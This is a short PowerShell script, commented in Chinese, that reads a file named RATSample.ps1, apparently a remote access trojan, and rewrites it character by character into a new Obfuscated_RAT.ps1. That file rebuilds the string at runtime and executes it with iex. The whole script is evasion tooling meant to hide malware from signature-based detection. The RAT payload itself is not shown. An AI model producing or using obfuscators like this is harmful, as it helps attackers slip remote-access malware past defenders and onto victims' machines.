# 使用PowerShell读取 RATSample.ps1 文件中的内容
$originalScript = Get-Content -Path "../../RATSample.ps1"
# 将脚本中的每个字符分解为单独的元素
$splitScript = $originalScript.ToCharArray()
# 遍历每个字符，创建一个将这些字符重新组合的脚本
$obfuscatedScript = ""
$counter = 1
foreach ($char in $splitScript) {
    $varName = "var" + $counter
    $obfuscatedScript += "`$$varName = '$char'; "
    $counter++
}
$obfuscatedScript += "`$cmd = "
for ($i = 1; $i -lt $counter; $i++) {
    $obfuscatedScript += "`$var$i + "
}
$obfuscatedScript = $obfuscatedScript.TrimEnd(" + ") + "; iex `$cmd"
# 将生成的混淆脚本写入到一个新文件
$obfuscatedScript | Out-File -FilePath "Obfuscated_RAT.ps1"
